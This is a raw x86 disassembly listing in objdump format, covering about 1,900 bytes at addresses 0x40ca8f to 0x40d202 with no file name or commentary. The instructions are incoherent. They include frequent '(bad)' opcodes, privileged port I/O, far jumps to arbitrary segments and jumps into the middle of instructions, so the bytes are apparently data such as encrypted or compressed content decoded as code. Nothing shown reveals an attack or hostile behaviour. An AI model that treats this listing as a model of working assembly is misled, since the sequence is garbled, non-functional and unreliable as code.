  40ca8f:	into   
  40ca90:	and    DWORD PTR cs:[esi],eax
  40ca93:	ss cmp eax,0xda1d320c
  40ca99:	hlt    
  40ca9a:	(bad)  
  40ca9b:	mov    ch,0x50
  40ca9d:	clc    
  40ca9e:	or     BYTE PTR [ebx],bh
  40caa0:	and    BYTE PTR [ebx+0x25d346fc],bl
  40caa6:	cli    
  40caa7:	cmp    eax,0x5b9443ce
  40caac:	dec    ebx
  40caad:	je     0x40caa8
  40caaf:	leave  
  40cab0:	test   DWORD PTR [ecx],0xcd9576f9
  40cab6:	inc    esi
  40cab7:	ror    DWORD PTR [edx+esi*1-0x4a06b35b],1
  40cabe:	out    dx,eax
  40cabf:	outs   dx,BYTE PTR ds:[esi]
  40cac0:	call   DWORD PTR [eax+edx*4]
  40cac3:	xor    BYTE PTR fs:[ebp-0x67598ed0],dl
  40caca:	enter  0xffe2,0xe9
  40cace:	fs add eax,0x63f0dc07
  40cad4:	cmp    ecx,DWORD PTR [esp+edx*8]
  40cad7:	push   cs
  40cad8:	mov    cl,0xf0
  40cada:	mov    al,0x9
  40cadc:	or     BYTE PTR [esi],dh
  40cade:	int    0xab
  40cae0:	jge    0x40caa3
  40cae2:	sbb    al,0x9e
  40cae4:	and    DWORD PTR [ecx],ebp
  40cae6:	and    esp,DWORD PTR [ebp+0xa7bb7ce]
  40caec:	pushf  
  40caed:	rcl    DWORD PTR [ebx-0x21],cl
  40caf0:	pop    ecx
  40caf1:	in     al,0xea
  40caf3:	addr16 mov al,ds:0x2579
  40caf7:	pop    edx
  40caf8:	ss aam 0x9
  40cafb:	cdq    
  40cafc:	stos   DWORD PTR es:[edi],eax
  40cafd:	xor    al,0x4c
  40caff:	(bad)  
  40cb01:	pop    ss
  40cb02:	cmp    edi,ebp
  40cb04:	(bad)  
  40cb05:	fdivr  DWORD PTR [ebp+0x24]
  40cb08:	cmp    BYTE PTR [ebp+0x2e9b1bf4],bl
  40cb0e:	sub    ebx,esi
  40cb10:	pusha  
  40cb11:	and    esp,DWORD PTR [ebp+0x6f]
  40cb14:	cdq    
  40cb15:	mov    edx,0x13a50033
  40cb1a:	nop
  40cb1b:	fsubr  QWORD PTR [ecx+edx*4+0x63]
  40cb1f:	mov    DWORD PTR [edi],eax
  40cb21:	sbb    BYTE PTR [eax],dl
  40cb23:	(bad)  
  40cb24:	adc    edi,ecx
  40cb26:	cs push edx
  40cb28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb29:	jb     0x40cb65
  40cb2b:	jmp    0x40cb38
  40cb2d:	jmp    0x9230ead6
  40cb32:	pop    esp
  40cb33:	js     0x40cb3a
  40cb35:	sub    eax,0x85e13989
  40cb3a:	inc    esi
  40cb3b:	xchg   ecx,eax
  40cb3c:	fidivr DWORD PTR [ebx]
  40cb3e:	ins    BYTE PTR es:[edi],dx
  40cb3f:	or     BYTE PTR [esi],bl
  40cb41:	add    edi,ebp
  40cb43:	ds mov dh,0x73
  40cb46:	stos   BYTE PTR es:[edi],al
  40cb47:	das    
  40cb48:	addr16 dec edi
  40cb4a:	fild   WORD PTR [ebx-0x7ee928d2]
  40cb50:	(bad)  
  40cb51:	cmp    ebx,DWORD PTR [ecx+0x746f8fbf]
  40cb57:	rcl    BYTE PTR [eax-0x67],1
  40cb5a:	test   al,0xd4
  40cb5c:	push   ss
  40cb5d:	das    
  40cb5e:	mov    al,BYTE PTR [edx]
  40cb60:	xchg   BYTE PTR ds:0x6d95cf5c,dl
  40cb66:	aad    0x44
  40cb68:	imul   esi,ebx,0x24
  40cb6b:	dec    ebx
  40cb6c:	shl    ebx,1
  40cb6e:	sbb    DWORD PTR [ebp+0x2efc0bab],edi
  40cb74:	and    ah,BYTE PTR [ebx+eiz*8]
  40cb77:	test   BYTE PTR [edx+ebp*1+0x1d8fd8b4],0xab
  40cb7f:	mov    cs,ecx
  40cb81:	in     eax,dx
  40cb82:	outs   dx,DWORD PTR ds:[esi]
  40cb83:	ret    0x3e90
  40cb86:	and    BYTE PTR [ebx+0x41],ah
  40cb89:	addr16 xor al,0x89
  40cb8c:	cdq    
  40cb8d:	ss mov edx,0xe0bc2c65
  40cb93:	mov    al,0x47
  40cb95:	jmp    0x1888:0xaa9efb2f
  40cb9c:	lds    ebp,FWORD PTR [ebx-0x28]
  40cb9f:	outs   dx,DWORD PTR ds:[esi]
  40cba0:	push   es
  40cba1:	test   ecx,ecx
  40cba3:	int3   
  40cba4:	sbb    BYTE PTR ds:0x75e638ec,ah
  40cbaa:	bound  ebx,QWORD PTR [ecx]
  40cbac:	pop    esi
  40cbad:	iret   
  40cbae:	scas   eax,DWORD PTR es:[edi]
  40cbaf:	jo     0x40cbb5
  40cbb1:	scas   al,BYTE PTR es:[edi]
  40cbb2:	mov    esi,edi
  40cbb4:	sbb    eax,esp
  40cbb6:	pop    ebp
  40cbb7:	inc    ebp
  40cbb8:	mov    edx,0xf0834368
  40cbbd:	and    BYTE PTR [edx+0x528f924e],al
  40cbc3:	dec    ecx
  40cbc4:	test   DWORD PTR [eax],edi
  40cbc6:	arpl   dx,bp
  40cbc8:	rcl    DWORD PTR [edx],0x16
  40cbcb:	sbb    BYTE PTR [edx+0x63],dl
  40cbce:	mov    ecx,DWORD PTR [ecx-0x4d4d144e]
  40cbd4:	(bad)  
  40cbd5:	(bad)  
  40cbd6:	sub    esp,ecx
  40cbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbd9:	test   al,0xa9
  40cbdb:	jg     0x40cc56
  40cbdd:	lea    ecx,[ecx-0x11]
  40cbe0:	cli    
  40cbe1:	call   0x13b8:0x3f11b1ae
  40cbe8:	ss js  0x40cbf2
  40cbeb:	add    eax,0xe3e3c370
  40cbf0:	sar    DWORD PTR [edx+0x711465b3],cl
  40cbf6:	in     al,dx
  40cbf7:	cmp    ecx,esp
  40cbf9:	cmp    eax,0x31d13f52
  40cbfe:	stos   BYTE PTR es:[edi],al
  40cbff:	frstor [ebx]
  40cc01:	inc    esi
  40cc02:	jmp    0x40cc54
  40cc04:	ffreep st(6)
  40cc06:	dec    edx
  40cc07:	xchg   ebp,eax
  40cc08:	call   0x67b181a2
  40cc0d:	cmp    al,0xa
  40cc0f:	sbb    edx,DWORD PTR [ebx+0x35]
  40cc12:	inc    ecx
  40cc13:	jp     0x40cc5f
  40cc15:	sbb    al,0xaf
  40cc17:	lea    ebp,[edi+0x20dcf46]
  40cc1d:	adc    bh,BYTE PTR [edx-0x6d]
  40cc20:	das    
  40cc21:	jl     0x40cc38
  40cc23:	sub    cl,BYTE PTR [eax+0x50]
  40cc26:	and    DWORD PTR [ecx-0x78],edi
  40cc29:	sub    al,0xd7
  40cc2b:	inc    ecx
  40cc2c:	ret    
  40cc2d:	popa   
  40cc2e:	dec    ebx
  40cc2f:	int    0x53
  40cc31:	rcr    BYTE PTR [edi],1
  40cc33:	add    al,0xa
  40cc35:	push   eax
  40cc36:	mov    bl,0x94
  40cc38:	out    0x2f,al
  40cc3a:	sub    eax,0x552e3efe
  40cc3f:	add    eax,0xee3ee13b
  40cc44:	test   BYTE PTR [edx+ebp*1],dh
  40cc47:	inc    ebp
  40cc48:	cdq    
  40cc49:	sbb    cl,BYTE PTR [ecx+0x5e]
  40cc4c:	add    eax,ecx
  40cc4e:	sbb    esi,DWORD PTR [eax+0x509a082d]
  40cc54:	fs and ecx,edx
  40cc57:	clc    
  40cc58:	fucom  st(1)
  40cc5a:	(bad)  
  40cc5b:	out    0xc3,eax
  40cc5d:	and    BYTE PTR [edi],ch
  40cc5f:	popa   
  40cc60:	pop    ecx
  40cc61:	jo     0x40cc8f
  40cc63:	inc    ebp
  40cc64:	fs retf 0x3b9
  40cc68:	sub    eax,0x354c84a3
  40cc6d:	ret    
  40cc6e:	sub    DWORD PTR [eax-0x8],eax
  40cc71:	sbb    ebx,DWORD PTR [esi+0x73]
  40cc74:	add    al,0x82
  40cc76:	inc    ecx
  40cc77:	lods   eax,DWORD PTR ds:[esi]
  40cc78:	cmp    BYTE PTR es:[eax-0x170240fb],0x2b
  40cc80:	and    eax,0x6fded887
  40cc85:	div    dl
  40cc87:	clc    
  40cc88:	push   edx
  40cc89:	push   bx
  40cc8b:	das    
  40cc8c:	xor    BYTE PTR [ebp-0xd3dbf51],ah
  40cc92:	adc    al,0xbd
  40cc94:	ds add al,0x73
  40cc97:	or     BYTE PTR [edx+0x78],al
  40cc9a:	int3   
  40cc9b:	push   0xffffffca
  40cc9d:	and    edi,edx
  40cc9f:	outs   dx,DWORD PTR ds:[esi]
  40cca0:	fcmove st,st(0)
  40cca2:	jle    0x40cca0
  40cca4:	or     al,0x15
  40cca6:	scas   al,BYTE PTR es:[edi]
  40cca7:	les    eax,FWORD PTR [ebp+0x29]
  40ccaa:	xchg   ebp,eax
  40ccab:	adc    DWORD PTR [ebp-0x24f31ff6],edx
  40ccb1:	ins    BYTE PTR es:[edi],dx
  40ccb2:	sbb    ebx,ebp
  40ccb4:	xlat   BYTE PTR ds:[ebx]
  40ccb5:	mov    al,ds:0xf613de9d
  40ccba:	std    
  40ccbb:	in     eax,0x42
  40ccbd:	xor    eax,0x2fc1e702
  40ccc2:	and    al,0x71
  40ccc4:	add    BYTE PTR [esi+0x4958785e],al
  40ccca:	or     ebp,esi
  40cccc:	adc    eax,0x6a9853c1
  40ccd1:	adc    al,0x73
  40ccd3:	dec    edx
  40ccd4:	push   edx
  40ccd5:	mov    eax,ds:0x7bc5c658
  40ccda:	jb     0x40cd23
  40ccdc:	hlt    
  40ccdd:	fs aaa 
  40ccdf:	test   DWORD PTR [eax+0x10],edx
  40cce2:	push   cs
  40cce3:	mov    esi,gs
  40cce5:	dec    ebx
  40cce6:	sbb    al,0x31
  40cce8:	mov    BYTE PTR [ebx+0x47e7d8e5],bl
  40ccee:	stc    
  40ccef:	push   ebx
  40ccf0:	fist   DWORD PTR ds:0xc6dcd4c4
  40ccf6:	sbb    DWORD PTR [ebp-0x206a72c2],ecx
  40ccfc:	ret    
  40ccfd:	fwait
  40ccfe:	enter  0x5c84,0x64
  40cd02:	(bad)  [ebx+edi*2+0x27]
  40cd06:	pop    edi
  40cd07:	jae    0x40cc93
  40cd09:	fnstsw WORD PTR [edx-0x2e]
  40cd0c:	scas   al,BYTE PTR es:[edi]
  40cd0d:	out    dx,eax
  40cd0e:	aas    
  40cd0f:	jl     0x40ccb7
  40cd11:	fmul   DWORD PTR [ebp+0x4fac3b0b]
  40cd17:	cmp    eax,0x87e83cb7
  40cd1c:	push   0xffffffcf
  40cd1e:	pushf  
  40cd1f:	fldcw  WORD PTR [ebx-0x151a36e3]
  40cd25:	xchg   ebx,eax
  40cd26:	pop    eax
  40cd27:	sbb    DWORD PTR ds:0x441b07ae,eax
  40cd2d:	loope  0x40cda4
  40cd2f:	push   ds
  40cd30:	test   BYTE PTR [eax+0x7c0ccfcd],ch
  40cd36:	xchg   edx,eax
  40cd37:	enter  0xeb96,0xa3
  40cd3b:	adc    eax,0xf9664444
  40cd40:	fisub  DWORD PTR [ebx+0xc]
  40cd43:	pusha  
  40cd44:	adc    esi,DWORD PTR [edi+0x5e]
  40cd47:	dec    edi
  40cd48:	sahf   
  40cd49:	(bad)  
  40cd4a:	das    
  40cd4b:	and    BYTE PTR [ebx+0x2cbbd02c],al
  40cd51:	add    ecx,ecx
  40cd53:	pop    esp
  40cd54:	xchg   esi,eax
  40cd55:	or     al,0x9f
  40cd57:	call   0xdd80:0xd09f4ca4
  40cd5e:	adc    edi,DWORD PTR [edx-0x7c]
  40cd61:	jo     0x40cd8a
  40cd63:	lds    ebx,FWORD PTR [esi+0x57]
  40cd66:	(bad)  
  40cd67:	mov    ebp,0xb41ea4fc
  40cd6c:	ja     0x40cd97
  40cd6e:	call   0x9d21:0xbec63caf
  40cd75:	xchg   bp,ax
  40cd77:	push   cs
  40cd78:	sub    bh,BYTE PTR [esi]
  40cd7a:	and    eax,0xc694d92d
  40cd7f:	push   ecx
  40cd80:	dec    ebx
  40cd81:	dec    ebp
  40cd82:	push   ebp
  40cd83:	fcmovu st,st(4)
  40cd85:	js     0x40cd79
  40cd87:	jg     0x40cd14
  40cd89:	pop    edx
  40cd8a:	lock jae 0x40cd6a
  40cd8d:	popa   
  40cd8e:	adc    DWORD PTR [ebp+0x15575c3e],eax
  40cd94:	inc    eax
  40cd95:	inc    ecx
  40cd96:	mov    ebp,0xf7e93cbd
  40cd9b:	mov    bl,0xbc
  40cd9d:	cwde   
  40cd9e:	mov    esp,0xd7d2679c
  40cda3:	inc    ecx
  40cda4:	or     esp,DWORD PTR [ecx+0x1877e3b2]
  40cdaa:	push   es
  40cdab:	adc    DWORD PTR [ecx+0x3fabc465],esp
  40cdb1:	ja     0x40cdea
  40cdb3:	shr    BYTE PTR [ebp+0x7f04f5b1],1
  40cdb9:	mov    ah,0x44
  40cdbb:	push   0x4b
  40cdbd:	push   edi
  40cdbe:	add    al,0xf8
  40cdc0:	push   eax
  40cdc1:	inc    ecx
  40cdc2:	shl    BYTE PTR [edx],1
  40cdc4:	popa   
  40cdc5:	sub    al,BYTE PTR [edi-0x80]
  40cdc8:	mov    ds:0x3a5cf7c7,al
  40cdcd:	or     dh,al
  40cdcf:	push   ss
  40cdd0:	shr    DWORD PTR [eax],1
  40cdd2:	lds    esp,FWORD PTR [ebx]
  40cdd4:	and    al,0x21
  40cdd6:	and    al,0xa
  40cdd8:	push   edi
  40cdd9:	xchg   esp,eax
  40cdda:	or     edi,edi
  40cddc:	out    0xd8,eax
  40cdde:	jle    0x40cd8e
  40cde0:	shl    edx,1
  40cde2:	dec    esp
  40cde3:	rcl    DWORD PTR [bp+0x254a],cl
  40cde8:	mov    ebp,0x13967f92
  40cded:	pop    esp
  40cdee:	es push 0xffffffcd
  40cdf1:	xor    eax,0xcd86da6c
  40cdf6:	xchg   ecx,eax
  40cdf7:	sbb    cl,BYTE PTR [ebp+eiz*4-0xcb7ad8f]
  40cdfe:	dec    esi
  40cdff:	imul   esi,edi,0x47
  40ce02:	xchg   BYTE PTR [edx+0x143c5e5d],bh
  40ce08:	minps  xmm1,XMMWORD PTR [edi+esi*1]
  40ce0c:	outs   dx,BYTE PTR ds:[esi]
  40ce0d:	(bad)
  40ce11:	aas    
  40ce12:	aaa    
  40ce13:	fsubr  DWORD PTR [eax-0x5f]
  40ce16:	fimul  WORD PTR [ebx]
  40ce18:	test   BYTE PTR [ecx],0x77
  40ce1b:	sub    bh,BYTE PTR [ebx+0x73]
  40ce1e:	int3   
  40ce1f:	inc    eax
  40ce20:	mov    ecx,0x2ea650c8
  40ce25:	cdq    
  40ce26:	outs   dx,BYTE PTR ds:[esi]
  40ce27:	push   ebp
  40ce28:	pop    eax
  40ce29:	mov    eax,DWORD PTR [esi+ecx*1+0x5b]
  40ce2d:	in     al,0x17
  40ce2f:	pushf  
  40ce30:	std    
  40ce31:	xor    eax,0xb7fea328
  40ce36:	loope  0x40ce69
  40ce38:	mov    eax,ds:0x69a3f282
  40ce3d:	jnp    0x40ce9d
  40ce3f:	mov    eax,0xb7d8028e
  40ce44:	xlat   BYTE PTR ds:[ebx]
  40ce45:	dec    esp
  40ce46:	inc    esp
  40ce47:	fwait
  40ce48:	dec    edi
  40ce49:	pop    edx
  40ce4a:	xchg   ebx,eax
  40ce4b:	lahf   
  40ce4c:	dec    edi
  40ce4d:	fs in  al,dx
  40ce4f:	sbb    al,BYTE PTR [eiz*1+0x6b99b8b4]
  40ce56:	fwait
  40ce57:	pop    edx
  40ce58:	jg     0x40ce3b
  40ce5a:	les    edx,FWORD PTR [esi]
  40ce5c:	dec    ebp
  40ce5d:	mov    dl,0xe3
  40ce5f:	sub    BYTE PTR [ebp+0x62186f44],dh
  40ce65:	test   BYTE PTR [eax],al
  40ce67:	dec    edx
  40ce68:	sbb    ebp,ebx
  40ce6a:	neg    BYTE PTR [ecx]
  40ce6c:	jmp    0xe030:0x1fd2500a
  40ce73:	or     eax,0xf505301b
  40ce78:	and    DWORD PTR [esi+0x3f74370b],ecx
  40ce7e:	jmp    0xb3de:0xe3d4e3b6
  40ce85:	sub    BYTE PTR [ecx-0xe],ch
  40ce88:	sbb    ecx,esi
  40ce8a:	fnsave [ecx-0x482184f2]
  40ce90:	push   es
  40ce91:	mov    BYTE PTR [esi+0x23],bl
  40ce94:	ss adc al,0xd9
  40ce97:	jbe    0x40ced3
  40ce99:	mov    BYTE PTR [ebx-0x4fd6117e],dl
  40ce9f:	and    esp,DWORD PTR [edi+0x6a181948]
  40cea5:	mov    ecx,0x930a29fd
  40ceaa:	or     DWORD PTR [ebp+0x45de1136],eax
  40ceb0:	(bad)  
  40ceb1:	inc    ebp
  40ceb2:	call   0xf786:0x4638e07b
  40ceb9:	or     eax,0x49dec024
  40cebe:	scas   eax,DWORD PTR es:[edi]
  40cebf:	lahf   
  40cec0:	add    esi,DWORD PTR [eax-0x5b]
  40cec3:	rcl    cl,cl
  40cec5:	jl     0x40ce95
  40cec7:	imul   edi,DWORD PTR [esi+0xc],0xa
  40cecb:	fiadd  WORD PTR [ebp-0x19]
  40cece:	repz jmp 0x13967571
  40ced4:	xor    ch,BYTE PTR [eax]
  40ced6:	ret    0xb507
  40ced9:	jno    0x40cf01
  40cedb:	cwde   
  40cedc:	enter  0x5825,0x90
  40cee0:	retf   
  40cee1:	gs adc ebp,esp
  40cee4:	and    eax,esi
  40cee6:	xor    BYTE PTR [edi],dh
  40cee8:	inc    ebp
  40cee9:	xchg   ecx,eax
  40ceea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceeb:	inc    ebx
  40ceec:	mov    ds:0xb5b90e63,eax
  40cef1:	outs   dx,DWORD PTR ds:[esi]
  40cef2:	jno    0x40cf53
  40cef4:	push   es
  40cef5:	lods   al,BYTE PTR ds:[esi]
  40cef6:	mov    ebp,0xc24f14a4
  40cefb:	jge    0x40cf35
  40cefd:	and    eax,0xb2bc2708
  40cf02:	push   ebp
  40cf03:	ret    
  40cf04:	in     al,dx
  40cf05:	inc    ecx
  40cf06:	mov    cl,0xb6
  40cf08:	push   ss
  40cf09:	stos   DWORD PTR es:[edi],eax
  40cf0a:	inc    ebx
  40cf0b:	in     al,0xd8
  40cf0d:	out    0x54,al
  40cf0f:	les    edi,FWORD PTR [edx+eiz*2]
  40cf12:	mov    bh,0x0
  40cf14:	in     al,dx
  40cf15:	push   ebp
  40cf16:	ss pop ebx
  40cf18:	pop    edi
  40cf19:	sub    DWORD PTR [eax],0x27867986
  40cf1f:	je     0x40cefc
  40cf21:	mov    edi,0x6668616e
  40cf26:	cmp    eax,0xfc61dd4f
  40cf2b:	sub    al,0xab
  40cf2d:	sub    DWORD PTR [ebp-0x79],0xffffffdb
  40cf31:	sbb    DWORD PTR [ebp-0x519b8d47],0x13
  40cf38:	push   ss
  40cf39:	cmp    DWORD PTR [ecx+0x46cb41cd],edi
  40cf3f:	or     ebp,ebp
  40cf41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf42:	in     eax,0x36
  40cf44:	lock daa 
  40cf46:	mov    bl,0x4b
  40cf48:	(bad)  
  40cf49:	leave  
  40cf4a:	in     eax,dx
  40cf4b:	sbb    edi,DWORD PTR [edi+eiz*4-0x4d]
  40cf4f:	(bad)
  40cf52:	mov    WORD PTR [ebx],es
  40cf54:	je     0x40cf04
  40cf56:	por    mm7,QWORD PTR [edx]
  40cf59:	lahf   
  40cf5a:	mov    bh,0x43
  40cf5c:	lods   al,BYTE PTR ds:[esi]
  40cf5d:	cmp    al,0xb0
  40cf5f:	mov    cl,BYTE PTR [eax-0x55]
  40cf62:	mov    ds:0xd1e31fd,al
  40cf67:	ret    
  40cf68:	jp     0x40ceed
  40cf6a:	clc    
  40cf6b:	xlat   BYTE PTR ds:[ebx]
  40cf6c:	xor    BYTE PTR [eax-0x1ce5dd9b],dh
  40cf72:	sahf   
  40cf73:	jbe    0x40cfda
  40cf75:	in     eax,dx
  40cf76:	adc    eax,0x655e15cf
  40cf7b:	jmp    0xce6:0x22ee60f0
  40cf82:	dec    edx
  40cf83:	test   BYTE PTR [esi-0x79303455],dl
  40cf89:	in     eax,0x2c
  40cf8b:	mov    ebx,0x98ce0722
  40cf90:	inc    edi
  40cf91:	jmp    0x3a81:0xc03dfaca
  40cf98:	add    eax,0x68339391
  40cf9d:	rcl    ebp,1
  40cf9f:	shl    DWORD PTR ds:0x49bb4f15,1
  40cfa5:	das    
  40cfa6:	add    dl,BYTE PTR [ecx]
  40cfa8:	je     0x40cff9
  40cfaa:	pop    es
  40cfab:	jnp    0x40cf31
  40cfad:	repz mov bl,0xfb
  40cfb0:	mov    ebp,0x4dc6c9d6
  40cfb5:	lds    esi,FWORD PTR [ecx]
  40cfb7:	cmc    
  40cfb8:	repnz jecxz 0x40cf3d
  40cfbb:	(bad)  
  40cfbc:	xchg   ecx,eax
  40cfbd:	dec    eax
  40cfbe:	and    esp,eax
  40cfc0:	or     DWORD PTR [eax-0x7bac575a],eax
  40cfc6:	adc    eax,0x51c9869c
  40cfcb:	adc    BYTE PTR [edi],dh
  40cfcd:	sbb    ch,dh
  40cfcf:	imul   BYTE PTR [edi+0x79]
  40cfd2:	cs js  0x40cfbb
  40cfd5:	and    ebx,DWORD PTR [edi+0x1d]
  40cfd8:	bound  ebp,QWORD PTR [ecx-0x16e94a2f]
  40cfde:	push   es
  40cfdf:	test   BYTE PTR [ecx+0x40],0x99
  40cfe3:	mov    dl,0xe8
  40cfe5:	mov    dl,0x1b
  40cfe7:	loope  0x40cfca
  40cfe9:	ficom  DWORD PTR [ebp+ebx*2+0x36]
  40cfed:	dec    esp
  40cfee:	cli    
  40cfef:	mov    al,0x63
  40cff1:	add    bh,BYTE PTR [ecx]
  40cff3:	ror    DWORD PTR [eax],1
  40cff5:	jg     0x40d033
  40cff7:	sbb    edi,esp
  40cff9:	arpl   WORD PTR [edx-0x69],si
  40cffc:	(bad)  
  40cffd:	fucom  st(7)
  40cfff:	mul    DWORD PTR [ecx+0x4d5910]
  40d005:	jg     0x40cfcb
  40d007:	push   ds
  40d008:	pop    ds
  40d009:	mov    ah,0x70
  40d00b:	xor    ebp,edi
  40d00d:	lahf   
  40d00e:	mov    DWORD PTR [eax+0x63],eax
  40d011:	pop    ebx
  40d012:	adc    DWORD PTR [edx+0xa],0xffffff9c
  40d016:	test   eax,esi
  40d018:	fcom   DWORD PTR [ebx+0x5e]
  40d01b:	cmp    cl,dl
  40d01d:	and    BYTE PTR [esi+0x727918fc],0xb8
  40d024:	mov    esp,0x655ce842
  40d029:	sar    DWORD PTR [edx+0x5a738fcc],1
  40d02f:	clc    
  40d030:	fidiv  DWORD PTR [edx-0xd23f97b]
  40d036:	push   es
  40d037:	test   DWORD PTR [eax+eiz*2+0x29418c93],ebx
  40d03e:	mov    ds:0x43574ac,eax
  40d043:	xor    al,BYTE PTR [eax+0x2e]
  40d046:	jecxz  0x40d0b6
  40d048:	call   0xbc73f4
  40d04d:	add    eax,0x4b85a420
  40d052:	nop
  40d053:	dec    esp
  40d054:	sti    
  40d055:	mov    edi,0x20d6be1
  40d05a:	mov    es:0xea01bc32,eax
  40d060:	mov    esp,0x5ddd0d71
  40d065:	punpckhbw mm0,QWORD PTR [ecx]
  40d068:	mov    BYTE PTR [ecx-0x71],dh
  40d06b:	xor    BYTE PTR [esp+ecx*4],cl
  40d06e:	push   ss
  40d06f:	pop    es
  40d070:	mov    ds:0xeb4d1ab4,eax
  40d075:	jo     0x40d059
  40d077:	pusha  
  40d078:	enter  0x8e23,0xe0
  40d07c:	or     al,0x7b
  40d07e:	cli    
  40d07f:	out    0xe3,eax
  40d081:	mov    ch,0x17
  40d083:	or     al,0xee
  40d085:	and    ah,BYTE PTR cs:[ebx+0x4]
  40d089:	push   ss
  40d08a:	ds data16 cs ja 0x40d064
  40d08f:	inc    ecx
  40d090:	daa    
  40d091:	sub    BYTE PTR [edx+0xacfec81],cl
  40d097:	inc    esi
  40d098:	iret   
  40d099:	push   esp
  40d09a:	stc    
  40d09b:	cdq    
  40d09c:	and    al,0x34
  40d09e:	repnz inc edx
  40d0a0:	push   eax
  40d0a1:	sbb    al,0x34
  40d0a3:	lds    eax,FWORD PTR [ebp+0x79]
  40d0a6:	sbb    ebx,ecx
  40d0a8:	mov    ecx,0x445dabfc
  40d0ad:	xchg   edi,eax
  40d0ae:	xchg   esi,eax
  40d0af:	pop    ebp
  40d0b0:	stos   DWORD PTR es:[edi],eax
  40d0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b2:	or     dl,bh
  40d0b4:	cld    
  40d0b5:	test   BYTE PTR [edx+edi*8+0x71],bl
  40d0b9:	xchg   edx,eax
  40d0ba:	sub    eax,DWORD PTR [eax+0x1764bb5a]
  40d0c0:	xchg   ebx,eax
  40d0c1:	pop    esi
  40d0c2:	fst    QWORD PTR [ebp-0x57c2b1f0]
  40d0c8:	xchg   edx,eax
  40d0c9:	add    eax,0x2306bed4
  40d0ce:	add    ah,bl
  40d0d0:	stc    
  40d0d1:	not    ecx
  40d0d3:	sub    DWORD PTR [ecx+0x6b3f391e],ecx
  40d0d9:	imul   BYTE PTR [eax]
  40d0db:	call   0xc7ea8f38
  40d0e0:	outs   dx,DWORD PTR ds:[esi]
  40d0e1:	add    al,0x3e
  40d0e3:	or     BYTE PTR [edx-0x68381143],dh
  40d0e9:	dec    eax
  40d0ea:	or     BYTE PTR [ecx],ah
  40d0ec:	mov    ah,0xc6
  40d0ee:	mov    edx,0x2091707c
  40d0f3:	int    0xa1
  40d0f5:	mov    DWORD PTR [edx],edi
  40d0f7:	pop    ds
  40d0f8:	lods   al,BYTE PTR ds:[esi]
  40d0fa:	pop    esp
  40d0fb:	xchg   ebx,eax
  40d0fc:	dec    eax
  40d0fd:	cmp    BYTE PTR [edx-0x2b],bl
  40d100:	or     al,0x28
  40d102:	jnp    0x40d117
  40d104:	jmp    0x40d0ad
  40d106:	mov    cl,0xeb
  40d108:	lds    esi,FWORD PTR [ebx+ecx*2+0x3028de90]
  40d10f:	nop
  40d110:	leave  
  40d111:	xor    DWORD PTR [eax-0x6a],ecx
  40d114:	popf   
  40d115:	jecxz  0x40d09c
  40d117:	fst    DWORD PTR [eax+0x5e38ed82]
  40d11d:	pop    ds
  40d11e:	sar    esp,1
  40d120:	mov    ds:0x8abd60d7,al
  40d125:	sbb    bl,BYTE PTR [ebx+0x1752764e]
  40d12b:	inc    ecx
  40d12c:	fcomp  QWORD PTR [esi+eax*8+0x19]
  40d130:	repz jl 0x40d173
  40d133:	gs pop ebp
  40d135:	lahf   
  40d136:	popf   
  40d137:	data16 mov bl,0xd4
  40d13a:	shr    BYTE PTR [ecx+0x15],0x5b
  40d13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d13f:	push   edi
  40d140:	pop    edi
  40d141:	cdq    
  40d142:	(bad)  
  40d143:	jbe    0x40d1a6
  40d145:	jnp    0x40d0cb
  40d147:	aad    0xaf
  40d149:	sbb    BYTE PTR ds:0xd19e569f,bl
  40d14f:	mov    ds:0xa26cc7f9,eax
  40d154:	add    dl,BYTE PTR [edi]
  40d156:	jp     0x40d17a
  40d158:	cli    
  40d159:	push   edi
  40d15a:	sbb    al,0x5c
  40d15c:	out    dx,al
  40d15d:	xor    dl,BYTE PTR [ecx]
  40d15f:	xor    cl,ah
  40d161:	gs push ebx
  40d163:	ror    ebx,cl
  40d165:	inc    esp
  40d166:	mov    DWORD PTR [edi],ebx
  40d168:	adc    BYTE PTR [edi+esi*2],0x3e
  40d16c:	mov    dl,0x48
  40d16e:	(bad)
  40d171:	mov    cl,0xed
  40d173:	push   edx
  40d174:	cs scas eax,DWORD PTR es:[edi]
  40d176:	inc    edx
  40d177:	and    al,0x70
  40d179:	push   ebp
  40d17a:	daa    
  40d17b:	not    BYTE PTR ds:0x6c8ef691
  40d181:	mov    bl,0xe0
  40d183:	xor    cl,cl
  40d185:	popf   
  40d186:	cmp    eax,0xf358b050
  40d18b:	adc    al,0x9a
  40d18d:	fld    TBYTE PTR [esi-0x38]
  40d190:	inc    edi
  40d191:	fdivr  QWORD PTR [ecx+0xd4b4d62]
  40d198:	clc    
  40d199:	push   edi
  40d19a:	cwde   
  40d19b:	mov    bl,0x69
  40d19d:	sbb    ch,BYTE PTR [esi+0x373754a1]
  40d1a3:	shl    BYTE PTR [ebx+0x61],0xe5
  40d1a7:	inc    edx
  40d1a8:	adc    al,0xf
  40d1aa:	cmp    DWORD PTR [ebx],eax
  40d1ac:	cdq    
  40d1ad:	jo     0x40d14c
  40d1af:	mov    ebp,0x61f76267
  40d1b4:	push   0xce3c4571
  40d1b9:	pushf  
  40d1ba:	cdq    
  40d1bb:	inc    esp
  40d1bc:	jp     0x40d161
  40d1be:	cmp    al,0x3e
  40d1c0:	mov    dl,BYTE PTR [ecx-0x46e37067]
  40d1c6:	mov    cl,0x7b
  40d1c8:	pop    eax
  40d1c9:	sub    BYTE PTR [esi-0x59],ch
  40d1cc:	cmp    bl,bl
  40d1ce:	loop   0x40d1ab
  40d1d0:	xor    eax,0x9721a1ec
  40d1d5:	xchg   BYTE PTR [ecx-0x3a7fe269],bl
  40d1db:	nop
  40d1dc:	stc    
  40d1dd:	jmp    0x4f38:0xeff415ea
  40d1e4:	mov    ds:0x95ba538f,eax
  40d1e9:	(bad)  
  40d1ea:	dec    esp
  40d1eb:	adc    al,0x28
  40d1ed:	mov    ecx,0xe1c456fa
  40d1f2:	push   0x75
  40d1f4:	and    ebx,ebx
  40d1f6:	test   al,0x4f
  40d1f8:	sub    ah,dl
  40d1fa:	dec    esp
  40d1fb:	push   es
  40d1fc:	adc    eax,DWORD PTR [eax-0x6c79750c]
  40d202:	dec    edx
